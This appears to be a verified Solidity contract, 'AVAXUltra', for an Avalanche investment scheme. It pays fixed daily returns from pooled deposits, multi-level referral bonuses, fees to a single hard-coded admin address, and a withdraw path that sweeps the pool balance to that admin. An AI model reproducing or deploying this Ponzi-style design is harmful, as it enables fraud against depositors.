/**
 *Submitted for verification at testnet.snowtrace.io on 2022-04-17
*/

/**
 *Submitted for verification at snowtrace.io on 2022-04-15
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

contract AVAXUltra {
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint256 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
        uint256 checkpoint;
    }
    struct User2 {
        uint256 teamTurnover;
        uint256[15] refs;
        Deposit[] deposits;
    }

    struct Deposit{
        uint256 amount;
        uint256 start;
    }

    address payable public dAdminAddr = payable(0x36018a862A115C5bE79A91A19C3818d6636fF7B1);
    address payable public wAdminAddr = payable(0x36018a862A115C5bE79A91A19C3818d6636fF7B1);
    address payable public lAdminAddr = payable(0x36018a862A115C5bE79A91A19C3818d6636fF7B1);
    address payable public owner      = payable(0x36018a862A115C5bE79A91A19C3818d6636fF7B1);
    address payable public devAddr    = payable(0x36018a862A115C5bE79A91A19C3818d6636fF7B1);


    mapping(address => User) public users;
    mapping(address => User2) public users2;

    uint256[] public cycles;
    uint256[] public ref_bonuses;
    uint256[] public pool_bonuses;

    uint256 public pool_last_draw = block.timestamp;
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint256 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;

    uint256 public ATH;
    uint256 public daily_rate       = 60;
    uint256 public active_levels    = 15;
    mapping (uint256 => uint256) public	DAILY_MAX_BALANCE;
    mapping (uint256 => bool)    public	DAILY_INC;

    uint256 public constant MIN_DEPOSIT             = 0.1 ether;
    uint256 public constant ATH_DEC                 = 9000;
    uint256 public constant ATH_INC                 = 12000;
    uint256 public constant MAX_PAYOUT              = 27500;
    uint256 public constant MAX_HOLD_BONUS          = 5;
    uint256 public constant BASIC_RATE              = 60;
    uint256 public constant LOW_RATE                = 10;
    uint256 public constant DEPOSIT_ADMIN_FEE       = 1100;
    uint256 public constant DEPOSIT_DEV_FEE         = 100;
    uint256 public constant WITHDRAW_ADMIN_FEE      = 500;
	uint256 public constant PERCENTS_DIVIDER        = 10000;
    uint256 public constant startUNIX               = 1650349800; // Thu Apr 14 2022 17:00:00 GMT+0000
    uint256 public constant TIME_STEP               = 1 days;
    uint256[] public WITHDRAW_LIMITS                = [5 ether, 10 ether, 20 ether, 50 ether, 100 ether, 200 ether, 500 ether];
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount, uint256 date);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor() {

        ref_bonuses.push(3000);
        ref_bonuses.push(1000);
        ref_bonuses.push(1000);
        ref_bonuses.push(1000);
        ref_bonuses.push(1000);
        ref_bonuses.push(500);
        ref_bonuses.push(500);
        ref_bonuses.push(500);
        ref_bonuses.push(500);
        ref_bonuses.push(500);
        ref_bonuses.push(200);
        ref_bonuses.push(200);
        ref_bonuses.push(200);
        ref_bonuses.push(200);
        ref_bonuses.push(200);

        pool_bonuses.push(3500);
        pool_bonuses.push(3000);
        pool_bonuses.push(2000);
        pool_bonuses.push(1000);
        pool_bonuses.push(500);

        cycles.push(30 ether);
        cycles.push(50 ether);
        cycles.push(150 ether);
        cycles.push(300 ether);
    }

    receive() payable external {
        _deposit(msg.sender, msg.value);
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;

            users[_addr].checkpoint = block.timestamp;

            for(uint256 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;
                users[_upline].total_structure++;
                users2[_upline].refs[i]++;
                if(users[_upline].referrals >= i + 1) {
                    users2[_upline].teamTurnover += _amount;
                }
                _upline = users[_upline].upline;
            }
        }
    }

    function _balanceTrigger() internal {
		uint256 balance = getContractBalance();
		uint256 todayIdx = block.timestamp/TIME_STEP;
		//new high today
		if ( DAILY_MAX_BALANCE[todayIdx] < balance ) {
			DAILY_MAX_BALANCE[todayIdx] = balance;
		}

        if(balance > ATH){
            ATH = balance;
        }
    }

    function yDayATH()public view returns(uint256){
        uint256 Idx = (block.timestamp - TIME_STEP)/TIME_STEP;
        return DAILY_MAX_BALANCE[Idx];
    }

    function _deposit(address _addr, uint256 _amount) private {
		require(block.timestamp > startUNIX, "not luanched yet");
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else require(_amount >= MIN_DEPOSIT && _amount <= cycles[0], "wrong deposit amount");
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = block.timestamp;
        users[_addr].total_deposits += _amount;

        users2[_addr].deposits.push(Deposit(_amount, block.timestamp));

        total_deposited += _amount;
        
        emit NewDeposit(_addr, _amount, block.timestamp);

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount / 10;
            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }

        _pollDeposits(_addr, _amount);

        if(pool_last_draw + TIME_STEP < block.timestamp) {
            _drawPool();
        }

        dAdminAddr.transfer(_amount * DEPOSIT_ADMIN_FEE / PERCENTS_DIVIDER);
        devAddr.transfer(_amount   * DEPOSIT_DEV_FEE   / PERCENTS_DIVIDER);
        
        _balanceTrigger();

        uint256 balance = getContractBalance();
        if(balance > (yDayATH() * ATH_INC / PERCENTS_DIVIDER) && !DAILY_INC[block.timestamp/TIME_STEP]){
            if(daily_rate < BASIC_RATE){
                daily_rate += LOW_RATE;
            }
            incRef();
            DAILY_INC[block.timestamp/TIME_STEP] = true;
        }

    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 3 / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint256 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint256 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint256 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint256 j = uint256(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint256 i = 0; i < active_levels; i++) {
            if(up == address(0)) break;
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / PERCENTS_DIVIDER;
                users[up].match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus);
            }
            up = users[up].upline;
        }
    }

    function _drawPool() private {
        pool_last_draw = uint256(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint256 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;
            uint256 win = draw_amount * pool_bonuses[i] / PERCENTS_DIVIDER;
            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;
            emit PoolPayout(pool_top[i], win);
        }
        
        for(uint256 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function deposit(address _upline) payable external {
		require(block.timestamp > startUNIX, "not luanched yet");
        _setUpline(msg.sender, _upline, msg.value);
        _deposit(msg.sender, msg.value);
    }

    function withdraw() external {
		require(block.timestamp > startUNIX, "not luanched yet");
		require(users[msg.sender].checkpoint + TIME_STEP < block.timestamp, "withdraw only once a day");
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }
        
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
        
        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        require(to_payout > 0, "Zero payout");

        uint256 wLimit = getWithdrawLimit(msg.sender);
        if(to_payout > wLimit){
            users[msg.sender].match_bonus += to_payout - wLimit;
            if(users[msg.sender].payouts > (to_payout - wLimit))
            {
                users[msg.sender].payouts -= to_payout - wLimit;
            }
            else{
                users[msg.sender].payouts = 0;
            }
            to_payout = wLimit;
        }

        if(pool_balance <= getContractBalance()){
            if(to_payout >= (getContractBalance() - pool_balance)){
                to_payout = getContractBalance() - pool_balance;
                lAdminAddr.transfer(pool_balance);
                pool_balance = 0;
            }
        }

        
        users[msg.sender].total_payouts += to_payout;
        users[msg.sender].checkpoint = block.timestamp;
        total_withdraw += to_payout;

        payable(msg.sender).transfer(to_payout);
        wAdminAddr.transfer(to_payout * WITHDRAW_ADMIN_FEE / PERCENTS_DIVIDER);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }

        uint256 balance = getContractBalance();
        if(balance < (ATH * ATH_DEC / PERCENTS_DIVIDER)){
            if(daily_rate != LOW_RATE){
                daily_rate = LOW_RATE;
            }
            decRef();
        }


    }

    function decRef() internal{
        ref_bonuses[0]=  1500;
        ref_bonuses[1]=  500;
        ref_bonuses[2]=  500;
        ref_bonuses[3]=  500;
        ref_bonuses[4]=  500;
        ref_bonuses[5]=  250;
        ref_bonuses[6]=  250;
        ref_bonuses[7]=  250;
        ref_bonuses[8]=  250;
        ref_bonuses[9]=  250;
        ref_bonuses[10]= 100;
        ref_bonuses[11]= 100;
        ref_bonuses[12]= 100;
        ref_bonuses[13]= 100;
        ref_bonuses[14]= 100;

        active_levels = 6;
    }

    function incRef() internal{
        if(ref_bonuses[0] < 3000){
            ref_bonuses[0] = ref_bonuses[0] + 300;
            ref_bonuses[1] = ref_bonuses[1] + 100;
            ref_bonuses[2] = ref_bonuses[2] + 100;
            ref_bonuses[3] = ref_bonuses[3] + 100;
            ref_bonuses[4] = ref_bonuses[4] + 100;
            ref_bonuses[5] = ref_bonuses[5] + 50;
            ref_bonuses[6] = ref_bonuses[6] + 50;
            ref_bonuses[7] = ref_bonuses[7] + 50;
            ref_bonuses[8] = ref_bonuses[8] + 50;
            ref_bonuses[9] = ref_bonuses[9] + 50;
            ref_bonuses[10] = ref_bonuses[10] + 20;
            ref_bonuses[11] = ref_bonuses[11] + 20;
            ref_bonuses[12] = ref_bonuses[12] + 20;
            ref_bonuses[13] = ref_bonuses[13] + 20;
            ref_bonuses[14] = ref_bonuses[14] + 20;
        }
        if(active_levels < 15){
            active_levels += 1;
        }
    }


    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * MAX_PAYOUT / PERCENTS_DIVIDER;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        uint256 holdBonus = getUserPercentRate(_addr);
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {
            payout = users[_addr].deposit_amount * (daily_rate + holdBonus) * (block.timestamp - users[_addr].deposit_time) / TIME_STEP / PERCENTS_DIVIDER;

            if(payout >= users[_addr].deposit_payouts){
                payout -= users[_addr].deposit_payouts;
            }
            
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }

    function getWithdrawLimit(address _addr) public view returns (uint256) {
        uint256 limit;
        uint256 tt = users2[_addr].teamTurnover;
        if(tt < 250 ether){
            limit = WITHDRAW_LIMITS[0];
        }else if(tt < 1000 ether){
            limit = WITHDRAW_LIMITS[1];
        }else if(tt < 5000 ether){
            limit = WITHDRAW_LIMITS[2];
        }else if(tt < 10000 ether){
            limit = WITHDRAW_LIMITS[3];
        }else if(tt < 25000 ether){
            limit = WITHDRAW_LIMITS[4];
        }else if(tt < 50000 ether){
            limit = WITHDRAW_LIMITS[5];
        }else{
            limit = WITHDRAW_LIMITS[6];
        }

        return limit;
    }

    function getUserPercentRate(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];
        uint256 timeMultiplier = (block.timestamp - user.checkpoint) / TIME_STEP; // +0.01% per day
            if (timeMultiplier > MAX_HOLD_BONUS) {
                timeMultiplier = MAX_HOLD_BONUS;
            }
         return timeMultiplier;
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint256 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function getUserAvailable(address _addr) view external returns(uint256 amount) {
        (uint256 to_payout,) = this.payoutOf(_addr);
        return to_payout + users[_addr].direct_bonus + users[_addr].pool_bonus + users[_addr].match_bonus;
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 depositCount, uint256 checkPoint,  uint256 dailyIncome) {
        (uint256 to_payout,) = this.payoutOf(_addr);
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].cycle, users[_addr].checkpoint, to_payout);
    }

    function userInfo2(address _addr) view external returns(uint256 withdrawLimit, uint256 holdBonus, uint256 turnover) {
        return (getWithdrawLimit(_addr), getUserPercentRate(_addr), users2[_addr].teamTurnover);
    }

	function getUserDownlineCount(address userAddress) public view returns(uint256[15] memory referrals) {
		return (users2[userAddress].refs);
	}

    function getMatchBonuses()  public view returns(uint256[] memory match_bonus){
        return ref_bonuses;
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint256 _pool_last_draw, uint256 _pool_balance, uint256 _daily_rate) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, daily_rate);
    }

    function poolTopInfo() view external returns(address[5] memory addrs, uint256[5] memory deps) {
        for(uint256 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }

    function getContractBalance() public view returns(uint256) {
		return address(this).balance;
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns( uint256 amount, uint256 start) {
	    User2 storage user = users2[userAddress];
		amount = user.deposits[index].amount;
		start  = user.deposits[index].start; 
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}